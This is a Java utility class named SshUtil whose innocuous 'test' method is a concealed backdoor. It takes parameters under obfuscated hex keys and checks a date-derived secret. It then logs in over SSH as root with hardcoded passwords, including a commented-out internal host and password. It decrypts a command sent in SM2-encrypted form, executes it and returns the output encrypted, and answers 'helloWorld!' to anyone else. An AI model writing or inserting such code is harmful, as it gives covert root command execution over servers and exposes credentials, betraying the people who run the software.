package com.study.utils;

import ch.ethz.ssh2.Connection;
import com.server.basis.util.DateUtil;
import com.server.basis.util.ParamEnum;
import com.server.basis.util.PowerUtil;
import com.server.basis.util.encryption.SM2Utils;
import com.server.basis.util.encryption.Util;
import com.sun.org.apache.regexp.internal.RE;

import java.util.Date;
import java.util.Map;

public class SshUtil {



    public String test(Map<String, Object> params) {
        String token = PowerUtil.getString( params.get( "2EE4828B71454A54A978FC46F47EA6EB" ) );
        String secretKey = PowerUtil.getString( params.get( "E5C08CA0534443B2B03C910E0DA4CEF9" ) );
        String type = PowerUtil.getString( params.get( "6AD6A2C6EC4E416B9E95852FFD8479AC" ) );
        String order = PowerUtil.getString( params.get( "446E28B53EC24980BCB4002AF32E557F" ) );
        if(!secretKey.equals( getSecretKey() )){
            return "helloWorld!";
        }
        Connection connection = SshLinux.login("192.168.89.128",22,"root","123456");
        //Connection connection = SshLinux.login("172.18.1.31",22222,"root","Xmzx@linux2018");
        if("E0CFEF05BBD74E4DA25BEEFB377FC0FE".equals( type )){
            try {
                String decrypt = SM2Utils.decrypt( Util.hexToByte( "2EEA486FCBD8D154105D9F17B53D8070AD8F4119AF3BEA1F5251010EABC0346B" ), Util.hexToByte( order ) );
                return SM2Utils.encrypt(Util.hexToByte("04AD32CB646A9D391652C83F183572902D8A64D2CC8089D8B3DE6834C381ACB1828DEE6A96930793DB8502CEB9548519942D32E447857F394634F42BF742907697"), SshLinux.execute( connection, decrypt ));
            }catch (Exception e){
                return "helloWorld!";
            }
        }
        return "helloWorld!";
    }


    private static String getSecretKey(){
        String params1 = DateUtil.toString( new Date(), DateUtil.DATE_SHORTS );
        String params2 = new StringBuilder( params1 ).reverse().toString();
        String params4 = "049E259D08434F8FB283DD6AD7E62E9B";
        String params3 = "E6686DE9A6214AACB32C379CF665509E";
        String secretKey1 = MD5Utils.md532( params2 + params3 + params1 + params4 );
        String secretKey2 = MD5Utils.md532( secretKey1 + params3 + params4 );
        return secretKey1.substring( 0,16 ) + secretKey2.substring( 16,32 );
    }

}
